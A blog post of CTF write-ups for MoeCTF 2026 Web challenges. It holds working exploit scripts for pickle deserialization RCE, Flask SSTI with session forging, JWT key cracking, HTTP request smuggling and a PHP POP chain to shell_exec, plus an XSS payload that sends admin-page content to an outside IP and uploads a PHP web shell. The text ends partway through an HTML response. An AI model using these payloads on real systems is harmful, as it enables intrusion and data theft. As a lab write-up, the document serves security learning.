---
title: "MoeCTF 2026 Writeups (Selected Challenges)"
description: "Writeups for selected Web and operations challenges from MoeCTF 2026."
publishDate: 2026-10-11T15:20:38.409Z
tags:
  - "ctf"
  - "web"
heroImage:
  src: ../../blog/moectf-2026-writeup/moectf-2026-writeup.assets/city-light.jpg
  color: "#282838"
  alt: MoeCTF 2026 Writeups (Selected Challenges)
language: en
draft: false
slug: moectf-2026-writeup
---

> I really enjoyed this competition from Xidian. There were plenty of challenges, including interesting categories like operations, and the difficulty ramped up gradually. It felt perfect for beginners (why didn't I come across this when I was starting out 😭). I ended up clearing almost all of Web, apart from two Java challenges that I left alone since I haven't learned Java yet. I wrote these notes whenever I felt like it, so they don't cover everything, and I'm too lazy to fill in the gaps now, meow (

## Ops Starter Guide_revenge

The error log shows that `nginx` cannot find `/run/php/php-fpm.sock`:

```bash
moeops@ret2shell-1385-20608-1787049425:~$ cat /srv/blog/logs/error.log
2026/08/18 10:37:11 [crit] 290#290: *1 connect() to unix:/run/php/php-fpm.sock failed (2: No such file or directory) while connecting to upstream, client: 127.0.0.1, server: blog.moectf, request: "GET / HTTP/1.1", upstream: "fastcgi://unix:/run/php/php-fpm.sock:", host: "127.0.0.1:8080"
```

The socket path is wrong:

```bash
moeops@ret2shell-1385-20608-1787049425:~$ ls /run/php
php8.4-fpm.pid  php8.4-fpm.sock
```

Change it to the `8.4` socket:

```nginx
location ~ \.php$ {
  include fastcgi.conf;
  fastcgi_pass unix:/run/php/php8.4-fpm.sock;
  fastcgi_index index.php;
  # fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
  include fastcgi_params;
}
```

Save the configuration, check it with `sudo nginx -t`, then apply it with `sudo nginx -s reload`.

With nginx fixed, the next issue appears:

```
## Welcome to Typecho

The upload directory is not writable. Please make /usr/uploads under the installation directory writable, then continue the upgrade.

### Installation Instructions

**The installer automatically checks whether your server meets the minimum requirements. If it does not, a message will appear above; follow it to check your hosting configuration. If the requirements are met, a "Start the next step" button will appear below. Click it to complete the installation.**

### License and Terms

- Typecho is released under the [GPL](https://www.gnu.org/copyleft/gpl.html). You may use, copy, modify, and distribute it within the terms of that license, for both commercial and noncommercial purposes.
- Typecho is supported by its community. The core development team handles ongoing development and plans new features. If you have questions, find bugs, or want a new feature, join the community discussion or contribute code. Outstanding contributors will be listed in the credits.

I'm ready. Start the next step »
```

The upload directory is not writable. Check its permissions and the PHP-FPM worker user. Here is the actual output before the permission fix in this retest:

```bash
moeops@ret2shell-1385-20608-1791732675:~$ sudo namei -l /var/www/html/usr/uploads
f: /var/www/html/usr/uploads
drwxr-xr-x root     root     /
drwxr-xr-x root     root     var
drwxr-xr-x root     root     www
drwxr-xr-x www-data www-data html
drwx------ root     root     usr
drwxr-xr-x root     root     uploads
moeops@ret2shell-1385-20608-1791732675:~$ ps -eo user,pid,args | grep '[p]hp-fpm'
root         291 php-fpm: master process (/etc/php/8.4/fpm/php-fpm.conf)
www-data     292 php-fpm: pool www
www-data     293 php-fpm: pool www
```

`php-fpm` runs as `www-data`, but `/var/www/html/usr` has `drwx------` permissions, so `www-data` cannot traverse it. The `uploads` directory belongs to `root`, so `www-data` cannot write to it either. Update the permissions and ownership:

```bash
sudo chmod 755 /var/www/html/usr
sudo chown -R www-data:www-data /var/www/html/usr/uploads
```

Then configure the database as follows:

```
Database configuration:
Database name: blog
Username: moectf
Password: xdsec
Table prefix: typecho_
Database host: 127.0.0.1
Database port: 3306
```

Once installation is complete, the flag is visible.

## Bear Sighting

```
GET / HTTP/1.1
Host: 127.0.0.1:54321
```

```
gopher://127.0.0.1:54321/_GET%20%2F%20HTTP%2F1.1%0AHost%3A%20127.0.0.1%3A54321
```

```
HTTP/1.1 200 OK
Content-Type: text/plain; charset=utf-8
Content-Length: 33

Honey Vault
paths: /secret-honey
```

```
GET /secret-honey HTTP/1.1
Host: 127.0.0.1:54321
```

```
HTTP/1.1 200 OK
Content-Type: text/plain; charset=utf-8
Content-Length: 45

moectf{6dbe74d7-1314-c63a-8e39-1fed50346269}
```

## I Love Inventions

The challenge logic is simple: finish the third bizarre task within `20s` to redeem the flag.

I started with this script:

```python
import hashlib
import re
import requests

BASE = "http://127.0.0.1:57076"

s = requests.Session()
s.get(f"{BASE}/stage/3")                        # 拿 Cookie

codes = []
for invent in range(3, 289, 3):
    r = s.get(f"{BASE}/invent/{invent}")
    if "verdict-ok" in r.text:                  # 判题通过才收集
        codes += re.findall(r'data-code="([A-Z0-9]+)"', r.text)

answer = hashlib.sha256("|".join(codes).encode()).hexdigest()
print("通过", len(codes), "/96")
print("sha256 =", answer)

r = s.post(f"{BASE}/api/finalize", json={"answer": answer})
print(r.text)
```

It was far too slow to finish within `20s`, but I did notice a pattern: the stamped entries all had indices of the form `6*i`.

After a long and painful series of attempts, I switched to concurrent requests:

```python
import hashlib
import re
import requests
from concurrent.futures import ThreadPoolExecutor

BASE = "http://127.0.0.1:55616"
WORKERS = 8

s = requests.Session()
s.get(f"{BASE}/stage/3")                        # 拿 Cookie
cookies = s.cookies.get_dict()

def fetch(invent):
    r = requests.get(f"{BASE}/invent/{invent}", cookies=cookies)
    if "verdict-ok" in r.text:                  # 判题通过才收集
        return re.findall(r'data-code="([A-Z0-9]+)"', r.text)
    return []

with ThreadPoolExecutor(max_workers=WORKERS) as ex:
    codes = sum(ex.map(fetch, range(6, 289, 6)), [])

answer = hashlib.sha256("|".join(codes).encode()).hexdigest()
print("通过", len(codes), "/48")
print("sha256 =", answer)

r = s.post(f"{BASE}/api/finalize", json={"answer": answer})
print(r.text)
```

That got the flag.

### Flag

```
moectf{Comput3rs_@r3_m@gn!fic3nt_+00l}
```

## Logging System

The `/import` route trusts uploaded files completely and deserializes them directly. A malicious class can therefore trigger RCE:

```python
@app.route("/import", methods=["POST"])
def import_logs():
    """
    小D为了兼容各种数据，直接对上传内容执行反序列化，
    还能把还原出来的对象直接展示出来，方便预览。
    """
    f = request.files.get("file")
    if not f or not f.filename:
        return redirect("/?err=请选择要导入的文件")
    data = f.read()
    if not data:
        return redirect("/?err=文件内容为空")
    try:
        obj = pickle.loads(data)
    except Exception as e:
        return redirect("/?err=反序列化失败：" + str(e)[:200])
```

It even conveniently returns the result:

```python
# 单个对象 / 其他：把反序列化结果直接展示出来供预览
preview = str(obj).replace("\n", " ").replace("\r", " ").strip()[:200]
return redirect("/?msg=" + quote("导入预览结果：" + preview))
```

**exp.py**

```python
import requests
import pickle
from urllib.parse import unquote

cmd = input("输入cmd：")

base = "http://127.0.0.1:62462"

class Evil:
    def __reduce__(self):
        return (eval, (f"__import__('os').popen({cmd!r}).read()",))

payload = pickle.dumps(Evil())

r = requests.post(
    f"{base}/import",
    files={"file":("logs.pkl",payload)},
    allow_redirects=False,
    )

print(unquote(r.headers.get("Location").split("/?msg=")[1]))
```

The flag turns out to be in an environment variable:

```
输入cmd：env | grep -iE 'flag'
导入预览结果：FLAG=moectf{d24b9f82-c363-307e-1aab-cb0b826ad20f}
```

### Flag

```
moectf{d24b9f82-c363-307e-1aab-cb0b826ad20f}
```

## bblogin

```python
error_html = f'<div class="error"><p>用户{username}登录失败</p></div>'
```

The username is inserted directly into the template, leading to SSTI.

Use `{{config}}` to read the `secret_key`, then forge an admin cookie:

```html
<div class="error"><p>用户&lt;Config {&#39;DEBUG&#39;: False, &#39;TESTING&#39;: False, &#39;PROPAGATE_EXCEPTIONS&#39;: None, &#39;SECRET_KEY&#39;: &#39;dc08b31be785b29fef723b03db5827e9153c847ed875075cd3eda25fcd02552d&#39;, &#39;SECRET_KEY_FALLBACKS&#39;: None, &#39;PERMANENT_SESSION_LIFETIME&#39;: datetime.timedelta(days=31), &#39;USE_X_SENDFILE&#39;: False, &#39;TRUSTED_HOSTS&#39;: None, &#39;SERVER_NAME&#39;: None, &#39;APPLICATION_ROOT&#39;: &#39;/&#39;, &#39;SESSION_COOKIE_NAME&#39;: &#39;session&#39;, &#39;SESSION_COOKIE_DOMAIN&#39;: None, &#39;SESSION_COOKIE_PATH&#39;: None, &#39;SESSION_COOKIE_HTTPONLY&#39;: True, &#39;SESSION_COOKIE_SECURE&#39;: False, &#39;SESSION_COOKIE_PARTITIONED&#39;: False, &#39;SESSION_COOKIE_SAMESITE&#39;: None, &#39;SESSION_REFRESH_EACH_REQUEST&#39;: True, &#39;MAX_CONTENT_LENGTH&#39;: None, &#39;MAX_FORM_MEMORY_SIZE&#39;: 500000, &#39;MAX_FORM_PARTS&#39;: 1000, &#39;SEND_FILE_MAX_AGE_DEFAULT&#39;: None, &#39;TRAP_BAD_REQUEST_ERRORS&#39;: None, &#39;TRAP_HTTP_EXCEPTIONS&#39;: False, &#39;EXPLAIN_TEMPLATE_LOADING&#39;: False, &#39;PREFERRED_URL_SCHEME&#39;: &#39;http&#39;, &#39;TEMPLATES_AUTO_RELOAD&#39;: None, &#39;MAX_COOKIE_SIZE&#39;: 4093, &#39;PROVIDE_AUTOMATIC_OPTIONS&#39;: True}&gt;登录失败</p></div>
```

**exp.py**

```python
from flask import Flask
from flask.sessions import SecureCookieSessionInterface

app = Flask(__name__)
app.secret_key = "dc08b31be785b29fef723b03db5827e9153c847ed875075cd3eda25fcd02552d"
serializer = SecureCookieSessionInterface().get_signing_serializer(app)
cookie = serializer.dumps({"token": "admin"})
print(cookie)
```

```
session=eyJ0b2tlbiI6ImFkbWluIn0.aoGV7A.XVh1ro-Y3cuVS18D46msIqFiHy0
```

```
{"info":"moectf{1045b0db-7685-d016-a3c2-04fde3a06711}","username":"admin"}
```

## Black Market Smuggling

### Premium Ticket

`/hint` tells us outright that the tickets use `JWT`. It even gives us a wordlist for the weak signing key, so we can try the candidates directly:

```
Standard Admission Ticket
header
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9
payload
eyJzdWIiOiJ0cmF2ZWxlciIsInJvbGUiOiJndWVzdCIsInNjb3BlIjoicmVhZCJ9
signature
CG6d0k62ZfRAcq9kdqz3TQIZ6irniRCrQLyqh9WbnM8
Complete ticket:
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ0cmF2ZWxlciIsInJvbGUiOiJndWVzdCIsInNjb3BlIjoicmVhZCJ9.CG6d0k62ZfRAcq9kdqz3TQIZ6irniRCrQLyqh9WbnM8
Common Merchant Codewords
The old merchant likes to choose one of these words as his stamp ink:

MoeCTF / xdu / xidian / xdsec / L / welcome / happy / fish
Rumor has it that premium buyers' tickets say role=admin, and the trading scope must also be stamped scope=flags. A standard ticket with scope=read only lets you read the notices, not buy restricted goods.
```

**jwt.py**

```python
import base64, hashlib, hmac

token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ0cmF2ZWxlciIsInJvbGUiOiJndWVzdCIsInNjb3BlIjoicmVhZCJ9.CG6d0k62ZfRAcq9kdqz3TQIZ6irniRCrQLyqh9WbnM8"
head, sig = token.rsplit(".", 1)

for line in open("1.txt", encoding="utf-8", errors="ignore"):
    secret = line.strip()
    mac = hmac.new(secret.encode(), head.encode(), hashlib.sha256).digest()
    if base64.urlsafe_b64encode(mac).rstrip(b"=").decode() == sig:
        print("found:", secret)
        break
```

The `secret_key` is `fish`. With that, we can forge a ticket:

**jwt_forge.py**

```python
import base64, hashlib, hmac

def b64(s):
    return base64.urlsafe_b64encode(s).rstrip(b"=").decode()

header = b64(b'{"alg":"HS256","typ":"JWT"}')
payload = b64(b'{"sub":"traveler","role":"admin","scope":"flags"}')
head = f"{header}.{payload}"
sig = b64(hmac.new(b"fish", head.encode(), hashlib.sha256).digest())
print(f"{head}.{sig}")
```

Here is the premium ticket:

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ0cmF2ZWxlciIsInJvbGUiOiJhZG1pbiIsInNjb3BlIjoiZmxhZ3MifQ.EQmuoZNLf5aUF-WJ1MdjUFZJgPilOkgJRjXawdvIooI
```

### Black Market Dealer 1

```
Black Market Dealer 1
Rumor has it that he knows the old docks' two sets of ledgers: one for CL's runner and one for TE's contact.

Black Market Dealer 1: The Old Dock Bookkeeper
He dims the oil lamp and points to the back door.

"We'll take a few hidden paths. I'll have CL's runner explain it to you; just have him contact TE when the time comes."

Trading code: First, let the counter check only the crate's length. Then let the back warehouse count it in chunks.
Target goods: /flag1
Remember to bring a ticket proving that you are a premium buyer.
```

Clearly, `CL` means `Content-Length`, and `TE` means `Transfer-Encoding`. “The counter checks only the crate's length” means that the frontend uses `Content-Length` to determine request boundaries. “The back warehouse counts in chunks” means that the backend parses `Transfer-Encoding: chunked`.

We can therefore construct an `http` request like the one below. When the backend reads `0\r\n\r\n`, it considers the `chunked body` complete. It then handles the remaining `GET /flag1...` as a separate request, bypassing the frontend's checks entirely.

```http
GET /stage1 HTTP/1.1
Host: target
Content-Length: xxx
Transfer-Encoding: chunked
Connection: keep-alive

0

GET /flag1 HTTP/1.1
Authorization: Bearer xxx
Connection: close
```

**exp1.py**

```python
import socket

HOST = "127.0.0.1"
PORT = 63681

JWT = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ0cmF2ZWxlciIsInJvbGUiOiJhZG1pbiIsInNjb3BlIjoiZmxhZ3MifQ.EQmuoZNLf5aUF-WJ1MdjUFZJgPilOkgJRjXawdvIooI"

# 第二个请求(走私)
smuggled = (
    b"0\r\n\r\n"
    b"GET /flag1 HTTP/1.1\r\n"
    b"Host: 127.0.0.1:" + str(PORT).encode() + b"\r\n"
    b"Authorization: Bearer " + JWT.encode() + b"\r\n"
    b"Connection: close\r\n\r\n"
)

# 第一个请求
payload = (
    b"GET /stage1 HTTP/1.1\r\n"
    b"Host: 127.0.0.1:" + str(PORT).encode() + b"\r\n"
    + f"Content-Length: {len(smuggled)}\r\n".encode()
    + b"Transfer-Encoding: chunked\r\n"
    + b"Connection: keep-alive\r\n\r\n"
    + smuggled
)

print(f"Content-Length = {len(smuggled)}")
print(f"总发送字节数 = {len(payload)}\n")

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.settimeout(3)
s.connect((HOST, PORT))
s.sendall(payload)

resp = b""
try:
    while True:
        data = s.recv(4096)
        if not data:
            break
        resp += data
except socket.timeout:
    print("超时")

print(resp.decode("utf-8", errors="replace"))
s.close()
```

```
flag1: moectf{Y0u_have_m4r
```

### Black Market Dealer 2

```
Black Market Dealer 2
He never writes a message plainly. Even the colon on his envelopes tends to shift half a step.

Black Market Dealer 2: The Typo Courier
He hands over a crumpled waybill with a speck of dust before the colon.

"Both sides know TE, but they read the sign differently. Make the front door think it isn't that sign, while the back door keeps accepting goods by TE's rules."

Trading code: The gap after Transfer-Encoding might be the alley into the black market.
Target goods: /flag2
You still need a premium buyer's ticket.
```

The next hint says, “Both sides know TE, but they read the sign differently. Make the front door think it isn't that sign, while the back door keeps accepting goods by TE's rules.” This time, both the frontend and backend recognize `Transfer-Encoding`, but there is a way to make them interpret it differently. The references to “the gap after Transfer-Encoding” and shifting a colon point to inserting a space before the colon in the `Transfer-Encoding` header. That is invalid under the `RFC`, and the two parsers disagree on whether it counts as `Transfer-Encoding`: the frontend ignores it and falls back to `Content-Length`, while the backend still parses it as `Transfer-Encoding: chunked`.

A small change to the script is enough:

```python
import socket

HOST = "127.0.0.1"
PORT = 63681

JWT = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ0cmF2ZWxlciIsInJvbGUiOiJhZG1pbiIsInNjb3BlIjoiZmxhZ3MifQ.EQmuoZNLf5aUF-WJ1MdjUFZJgPilOkgJRjXawdvIooI"

# 第二个请求(走私)
smuggled = (
    b"0\r\n\r\n"
    b"GET /flag2 HTTP/1.1\r\n"
    b"Host: 127.0.0.1:" + str(PORT).encode() + b"\r\n"
    b"Authorization: Bearer " + JWT.encode() + b"\r\n"
    b"Connection: close\r\n\r\n"
)

# 第一个请求
payload = (
    b"GET /stage2 HTTP/1.1\r\n"
    b"Host: 127.0.0.1:" + str(PORT).encode() + b"\r\n"
    + f"Content-Length: {len(smuggled)}\r\n".encode()
    + b"Transfer-Encoding : chunked\r\n"
    + b"Connection: keep-alive\r\n\r\n"
    + smuggled
)

print(f"Content-Length = {len(smuggled)}")
print(f"总发送字节数 = {len(payload)}\n")

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.settimeout(3)
s.connect((HOST, PORT))
s.sendall(payload)

resp = b""
try:
    while True:
        data = s.recv(4096)
        if not data:
            break
        resp += data
except socket.timeout:
    print("超时")

print(resp.decode("utf-8", errors="replace"))
s.close()
```

```
flag2: 3d_http_5mu6g1!n6}
```

### Flag

```
moectf{Y0u_have_m4r3d_http_5mu6g1!n6}
```

## Qigou Paid Novels

An exposed `/.git` directory lets us recover the project's source with `GitHack`.

The `php` code is a classic deserialization challenge built around a `pop` chain. Omitting the username and password POST fields and supplying the user cookie takes us into the `elseif` branch, where deserialization begins:

```php
if (isset($_POST['username']) && isset($_POST['password'])) {
    $username = $_POST['username'];
    $password = $_POST['password'];

    $user = new User($username, $password);

    $data = base64_encode(serialize($user));
    setcookie('user', $data, time() + 3600, '/');
    $curr_user = $user;

} elseif (isset($_COOKIE['user'])) {
    $data = base64_decode($_COOKIE['user']);
    $curr_user = unserialize($data);
}
```

The likely endpoint is `shell_exec`, which gives us `RCE`. To reach it, we need to trigger `__invoke` by calling a `Diagnosis` object as a function.

```php
public function __invoke($value)
{
    return shell_exec("$this->key$value");
}
```

The expression `return ($this->action)($this->value)` does exactly that: it calls the `action` property as a function, triggering `__invoke` if that property holds an object. We can set this `Diagnosis` object's `action` property to another `Diagnosis` object. To enter `__get` in the first place, we need to access a nonexistent property on the outer object.

```php
public function __get($name)
{
    if ($name === $this->key && is_object($this->action)) {
        return ($this->action)($this->value);
    }
    return null;
}
```

The `__tostring` method of `UserInfo` accesses the `username` property of `$this->user`. Setting `$this->user` to a `Diagnosis` object gives us the missing-property access we need. Its `key` must be `"username"` to pass the `if` check above. Now we need to trigger `__tostring`.

```php
public function __tostring()
{
    return $this->user->username . "（权限等级：" . $this->permission . "）";
}
```

This `echo` converts `$this->username` to a string, linking it to the previous step. Set `$this->username` to a `UserInfo` object. Before reaching `echo`, though, we must pass two `if` checks. The first is satisfied by setting `username` and `password` to the same value.

```php
{
    if ($this->username !== $this->password)
        die("不对，密码不对！");
    if ($this->secret_a !== $this->secret_b)
        die("不行，要重新登录！");

    echo "已经登录啦：$this->username";
}
```

The `__wakeup` method randomizes `secret_b` as soon as deserialization begins, but that is easy to bypass: make `secret_b` a reference to `secret_a`.

```php
public function __wakeup()
{
    // 每次都要重新登录，这样坏人肯定进不来啦
    $this->secret_b = random_int(1000_0000, 9999_9999);
}
```

With the entire `pop` chain connected, we can build the payload.

Start with the outermost `User` object and make its `secret_b` a reference to `secret_a`. Its destructor needs to trigger `UserInfo::__tostring`, so set `username` to a `UserInfo` object. Converting that object to a string must then trigger `Diagnosis::__get`, so set the `UserInfo` object's `user` property to a `Diagnosis` object whose `key` is `username`, satisfying the `if` check. Next, calling that outer `Diagnosis` object's `action` as a function must trigger another object's `__invoke`, so assign an inner `Diagnosis` object to `action`. Finally, put the command in the inner object's `key`; its `__invoke` concatenates that with the argument passed from the outer object's `value` and calls `shell_exec`, giving us `RCE`.

**exp.php**

```php
<?php

class User
{
    public $username, $password;
    public $secret_a, $secret_b;
}

class UserInfo
{
    public $user, $permission;
}

class Diagnosis
{
    public $key, $value, $action;
}

$cmd = "ls /";
$inner_Diagnosis = new Diagnosis();
$inner_Diagnosis -> key = $cmd;
$inner_Diagnosis -> value = "";
$inner_Diagnosis -> action = "";

$outer_Diagnosis = new Diagnosis();
$outer_Diagnosis -> key = "username";
$outer_Diagnosis -> value = "";
$outer_Diagnosis -> action = $inner_Diagnosis;

$UserInfo = new UserInfo();
$UserInfo -> user = $outer_Diagnosis;
$UserInfo -> permission = "";

$User = new User();
$User -> username = $UserInfo;
$User -> password = $User -> username;
$User -> secret_a = 0;
$User -> secret_b =& $User -> secret_a;

$payload = serialize($User);

print($payload);
print("\n");
print(base64_encode($payload));
print("\n");
```

```
"ls /"
已经登录啦：bin
dev
etc
flag
home
lib
media
mnt
opt
proc
root
run
sbin
srv
start.sh
sys
tmp
usr
var
（权限等级：）

"cat /flag"
已经登录啦：moectf{6886b610-5a5c-9e86-0da0-5fe43cc76195}
（权限等级：）
```

### Flag

```
moectf{6886b610-5a5c-9e86-0da0-5fe43cc76195}
```

## Moe Forum

### XSS

The challenge description and forum introduction provide these hints:

```
Admin D, who holds the flag, needs to monitor forum activity in real time.
```

```
Use the image-sharing feature to generate your own link.
```

That suggests `XSS`, probably through an `img` tag.

Trying to steal the admin's `Cookie` did not work, probably because it was marked `HttpOnly`. Instead, I tried making the admin visit a page for me.

Here is what `dirsearch` found:

```bash
[00:19:44] Scanning: 
[00:19:58] 301 -   355B - /admin  ->  http://127.0.0.1:60137/admin/         
[00:19:59] 403 -    26B - /admin/                                           
[00:19:59] 403 -   317B - /admin/.htaccess                                  
[00:19:59] 403 -    26B - /admin/index.php                                  
[00:19:59] 403 -    43B - /admin/upload.php                                 
[00:20:08] 403 -   317B - /assets/                                          
[00:20:08] 301 -   356B - /assets  ->  http://127.0.0.1:60137/assets/       
[00:20:12] 403 -   317B - /data/autosuggest                                 
[00:20:12] 403 -   317B - /data/adminer.php                                 
[00:20:12] 403 -   317B - /data/backups/
[00:20:12] 403 -   317B - /data/                                            
[00:20:12] 301 -   354B - /data  ->  http://127.0.0.1:60137/data/           
[00:20:12] 403 -   317B - /data/debug/
[00:20:12] 403 -   317B - /data/DoctrineORMModule/cache/
[00:20:12] 403 -   317B - /data/files/
[00:20:12] 403 -   317B - /data/cache/
[00:20:12] 403 -   317B - /data/DoctrineORMModule/Proxy/
[00:20:12] 403 -   317B - /data/sessions/                                   
[00:20:12] 403 -   317B - /data/logs/
[00:20:12] 403 -   317B - /data/tmp/
[00:20:14] 403 -   317B - /fileadmin/                                       
[00:20:14] 301 -   359B - /fileadmin  ->  http://127.0.0.1:60137/fileadmin/ 
[00:20:14] 403 -   317B - /fileadmin/user_upload/                           
[00:20:14] 302 -     0B - /forum.php  ->  /login.php                        
[00:20:15] 403 -   317B - /includes/configure.php~                          
[00:20:15] 403 -   317B - /includes/                                        
[00:20:15] 403 -   317B - /includes/adovbs.inc                              
[00:20:15] 403 -   317B - /includes/fckeditor/editor/filemanager/connectors/aspx/connector.aspx
[00:20:15] 403 -   317B - /includes/bootstrap.inc                           
[00:20:15] 403 -   317B - /includes/fckeditor/editor/filemanager/connectors/asp/connector.asp
[00:20:15] 403 -   317B - /includes/fckeditor/editor/filemanager/browser/default/connectors/php/connector.php
[00:20:15] 403 -   317B - /includes/fckeditor/editor/filemanager/browser/default/connectors/asp/connector.asp
[00:20:15] 301 -   358B - /includes  ->  http://127.0.0.1:60137/includes/
[00:20:15] 403 -   317B - /includes/fckeditor/editor/filemanager/connectors/asp/upload.asp
[00:20:15] 403 -   317B - /includes/fckeditor/editor/filemanager/browser/default/connectors/aspx/connector.aspx
[00:20:15] 403 -   317B - /includes/fckeditor/editor/filemanager/upload/asp/upload.asp
[00:20:15] 403 -   317B - /includes/fckeditor/editor/filemanager/upload/php/upload.php
[00:20:15] 403 -   317B - /includes/fckeditor/editor/filemanager/upload/aspx/upload.aspx
[00:20:15] 403 -   317B - /includes/swfupload/swfupload.swf
[00:20:15] 403 -   317B - /includes/swfupload/swfupload_f9.swf
[00:20:15] 403 -   317B - /includes/js/tiny_mce
[00:20:15] 403 -   317B - /includes/tiny_mce
[00:20:15] 403 -   317B - /includes/js/tiny_mce/
[00:20:15] 403 -   317B - /includes/tiny_mce/
[00:20:15] 403 -   317B - /includes/tinymce                                 
[00:20:15] 403 -   317B - /includes/tinymce/                                
[00:20:16] 403 -   317B - /includes/fckeditor/editor/filemanager/connectors/aspx/upload.aspx
[00:20:16] 403 -   317B - /includes/fckeditor/editor/filemanager/connectors/php/upload.php
[00:20:16] 403 -   317B - /includes/fckeditor/editor/filemanager/connectors/php/connector.php
[00:20:16] 302 -     0B - /index.php/login/  ->  /login.php                 
[00:20:16] 302 -     0B - /index.php  ->  /login.php                        
[00:20:17] 200 -    1KB - /login.php                                        
[00:20:18] 302 -     0B - /logout.php  ->  /index.php                       
[00:20:25] 200 -    1KB - /register.php                                     
[00:20:26] 200 -   13KB - /server-status                                    
[00:20:26] 200 -   13KB - /server-status/                                   
[00:20:31] 301 -   359B - /templates  ->  http://127.0.0.1:60137/templates/ 
[00:20:31] 403 -   317B - /templates/                                       
[00:20:32] 301 -   357B - /uploads  ->  http://127.0.0.1:60137/uploads/     
[00:20:32] 403 -   317B - /uploads/                                         
[00:20:33] 302 -     0B - /view.php  ->  /login.php                         
                                                                             
Task Completed
```

Accessing `/admin` directly returns `ADMIN:403 Forbidden - Admin only`.

I tried this:

```html
<img src=x onerror="fetch('/admin/',{credentials:'include'}).then(r=>r.text()).then(t=>new Image().src='http://8.148.31.22/attack/1.php?1='+encodeURIComponent('ADMIN:'+t))">
```

But nothing ever arrived. The admin bot might not have access to the external network.

Meanwhile, I noticed that `/share.php?my_name=000&user=111` takes two `url` parameters: `user` identifies the profile being visited, while `my_name` identifies the visitor. Since we can control the visitor name, we can send the `XSS` result back to the same site and read it at `/share.php?view=visitors`.

Try this instead:

```html
 <img src=x onerror="fetch('/admin/',{credentials:'include'}).then(r=>r.text()).then(t=>new Image().src='/share.php?user=111&my_name='+encodeURIComponent('ADMIN:'+t))">
 ```

The response appears successfully:

```html
ADMIN:<!DOCTYPE html> <html lang="zh-CN"> <head> <meta charset="UTF-8"> <meta name="viewport" content="width=device-width, initial-scale=1.0"> <title>管理后台 - Moe Forum</title> <link rel="stylesheet" href="/assets/style.css"> </head> <body> <div class="container"> <header> <h1><a href="/forum.php">Moe Forum</a></h1> <p class="subtitle">A simple 交流社区</p> <nav> <a href="/forum.php">论坛</a> <a href="/announcements.php">公告</a> <a href="/share.php">用户主页</a> <a href="/new_post.php">发帖</a> <a href="/admin/">管理后台</a> <span class="user-info">admin</span> <a href="/logout.php">退出</a> </nav> </header> <main> <div class="admin-section"> <h2>管理后台</h2> <p>欢迎回来，管理员。在这里可以管理论坛公告。</p> <p>管理的智慧：找不到的时候要善用工具</p> </div> <div class="admin-section"> <h2>发布公告</h2> <p>上传 Markdown 文件来发布公告（仅支持 .md 文件）。</p> <form id="uploadForm" action="/admin/upload.php" method="POST" enctype="multipart/form-data"> <div class="form-group"> <label>公告标题</label> <input type="text" name="title" placeholder="公告标题" required> </div> <div class="form-group"> <label>选择文件</label> <input type="file" name="file" id="fileInput" accept=".md,.markdown" required> <p class="upload-info">支持格式：.md &middot; 文件将被保存在服务器并展示在公告页。</p> <div id="fileError" class="alert alert-error" style="display:none;"></div> </div> <button type="submit" class="btn">上传发布</button> </form> </div> <div class="admin-section"> <h2>已发布公告</h2> <table style="width:100%; border-collapse:collapse;"> <tr style="text-align:left; border-bottom:2px solid #c8dcc8;"> <th style="padding:8px;">标题</th> <th style="padding:8px;">文件</th> <th style="padding:8px;">时间</th> </tr> <tr style="border-bottom:1px solid #e0e8e0;"> <td style="padding:8px;">欢迎公告</td> <td style="padding:8px; font-family:monospace; font-size:0.85em;">welcome.md</td> <td style="padding:8px; font-size:0.85em; color:#aaa;">2026-08-23 16:13:38</td> </tr> </table> </div> </main> <footer> <p>Moe Forum v1.0 &middot; Powered by SQLite</p> </footer> </div> </body> </html> <script> (function () { var blacklist = ['php', 'php3', 'php4', 'php5', 'php7', 'phps','.htaccess'];// Same as backend var form = document.getElementById('uploadForm'); var fileInput = document.getElementById('fileInput'); var errorBox = document.getElementById('fileError'); form.addEventListener('submit', function (e) { var filename = fileInput.value; if (!filename) return; var ext = filename.split('.').pop().toLowerCase(); if (blacklist.indexOf(ext) !== -1) { e.preventDefault(); errorBox.textContent = '非法文件类型！PHP文件不允许上传。'; errorBox.style.display = 'block'; fileInput.value = ''; } else { errorBox.style.display = 'none'; } }); fileInput.addEventListener('change', function () { errorBox.style.display = 'none'; }); })(); </script>
```

### File Upload RCE

The form with `action="/admin/upload.php" method="POST"` appears to handle file uploads. Its blacklist is `['php', 'php3', 'php4', 'php5', 'php7', 'phps','.htaccess']`, which leaves out `phtml`, among others.

Try uploading a one-line PHP web shell:

```html
<img src=x onerror="let fd=new FormData();fd.append('title','AUTO_PHTML');fd.append('file',new File([`<?php system($_GET['cmd']??'id'); ?>`],'a.phtml',{type:'text/plain'}));fetch('/admin/upload.php',{method:'POST',body:fd,credentials:'include'}).then(r=>r.text()).then(t=>new Image().src='/share.php?user=222&my_name='+encodeURIComponent('UPLOAD:'+t))">
```

```html
UPLOAD:<!DOCTYPE html> <html lang="zh-CN"> <head> <meta charset="UTF-8"> <meta name="viewport" content="width=device-width, initial-scale=1.0"> <title>公告 - Moe Forum</title> <link rel="stylesheet" href="/assets/style.css"> </head> <body> <div class="container"> <header> <h1><a href="/forum.php">Moe Forum</a></h1> <p class="subtitle">A simple 交流社区</p> <nav> <a href="/forum.php">论坛</a> <a href="/announcements.php">公告</a> <a href="/share.php">用户主页</a> <a href="/new_post.php">发帖</a> <a href="/admin/">管理后台</a> <span class="user-info">admin</span> <a href="/logout.php">退出</a> </nav> </header> <main> <div class="card"> <h2>管理员公告</h2> <div class="announcement"> <h3>AUTO_PHTML</h3> <p class="post-meta">2026-08-23 16:44:08</p> <div style="margin-top:10px; line-height:1.7;"> &lt;?php system($_GET[&#039;cmd&#039;]??&#039;id&#039;); ?&gt; </div> </div> <div class="announcement"> <h3>欢迎公告</h3> <p class="post-meta">2026-08-23 16:13:38</p> <div style="margin-top:10px; line-height:1.7;"> <h1>欢迎来到 Moe Forum</h1><br /> <br /> 